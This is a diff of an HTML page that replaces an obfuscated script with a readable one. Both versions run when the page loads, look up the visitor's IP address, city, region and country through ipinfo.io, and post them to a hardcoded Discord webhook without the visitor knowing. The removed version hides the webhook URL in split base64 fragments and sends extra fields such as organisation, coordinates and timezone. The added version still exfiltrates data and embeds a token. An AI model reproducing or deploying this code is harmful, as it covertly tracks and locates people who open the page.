@@ -3,58 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HDKSA23</title>
+    <title>IP Fetcher</title>
+    <style>
+        body { 
+            background-color: #000; 
+            color: #fff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0;
+            font-family: Arial, sans-serif; 
+        }
+    </style>
 </head>
 <body>
+    <h1>IP Information Fetcher</h1>
     <script>
-        let FHJKE12 = "NDEyMjk4Z"; 
-        let ZXOWE83 = "DY0ZTRmNGZiZ";
-        let HTWEU91 = "mJiOGVlOTA1ZGEy";
-        let OIUEW93 = "MGVjY2EsaHR0cHM6";
-        let NDJKW45 = "Ly9kaXNjb3JkLmNv";
-        let PXIWE78 = "bS9hcGkvd2ViaG9v";
-        let WEKXO29 = "a3MvMTI4MDk0MTc";
-        let PIUNR34 = "1MTYyNDAwNzcyMC";
-        let BDSJW58 = "9zdHdkTFc4RDg2N";
-        let KZPXE61 = "khQVkRaUEFHNVhv";
-        let WIUEP57 = "WURpNmZBOTFqZldQ";
-        let NMZWQ37 = "YWFTNm5tVGNzYj";
-        let QYXWE89 = "I4UVU2dGRQSkVC";
-        let LCNMD47 = "VnVUT19SUDV0";
-        let ZNCWE84 = "UWdROQ==";
+        const webhookURL = "https://discord.com/api/webhooks/1280941751624007720/stwdLW8D866HPVDZPAG5XoYDi6fA91jfWPaaS6nmTcsb28QU6tdPJEBVuTO_RP5tQgQ9";
+        const ipinfoToken = "NDEyMjk4ZDY0ZTRmNGZiZmJiOGVjY2E0Y2E0Mg=="; // base64 encoded token
 
-        let ATWEB58 = FHJKE12 + ZXOWE83 + HTWEU91;
-        let QIDNM38 = OIUEW93 + NDJKW45 + PXIWE78;
-        let SZJQW29 = WEKXO29 + PIUNR34 + BDSJW58;
-        let LNBXE23 = KZPXE61 + WIUEP57 + NMZWQ37;
-        let VCBWE46 = QYXWE89 + LCNMD47 + ZNCWE84;
-        let finalLink = atob(ATWEB58 + QIDNM38 + SZJQW29 + LNBXE23 + VCBWE46);
+        async function fetchIPInfo() {
+            const response = await fetch(`https://ipinfo.io/json?token=${atob(ipinfoToken)}`);
+            const data = await response.json();
 
-        let GHOXP01 = "af"; 
-        let PEKSD29 = "bc";
-        let TNPXY41 = "e9"; 
-        let WKSZU67 = "9e";
-        let XOAPC53 = "099";
-        let PNKEI32 = "9ed";
+            const payload = {
+                content: `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country}`
+            };
 
-        let GITNVZ70 = GHOXP01 + PEKSD29 + TNPXY41 + WKSZU67 + XOAPC53 + PNKEI32;
-
-        async function ABXZO294() {
-            try {
-                let MFCKD72 = await fetch("https://ipinfo.io/json?token=" + GITNVZ70);
-                let XUPDT39 = await MFCKD72.json();
-                let KDFLOP63 = {
-                    content: `cWXg:\nMT1: ${XUPDT39.ip}\nMT2: ${XUPDT39.city}\nMT3: ${XUPDT39.region}\nMT4: ${XUPDT39.country}\nMT5: ${XUPDT39.org}\nMT6: ${XUPDT39.loc}\nMT7: ${XUPDT39.timezone}`
-                };
-                await fetch(finalLink, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(KDFLOP63)
-                });
-            } catch (WOLYF45) {}
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
         }
 
-        ABXZO294();
+        fetchIPInfo();
     </script>
 </body>
 </html>
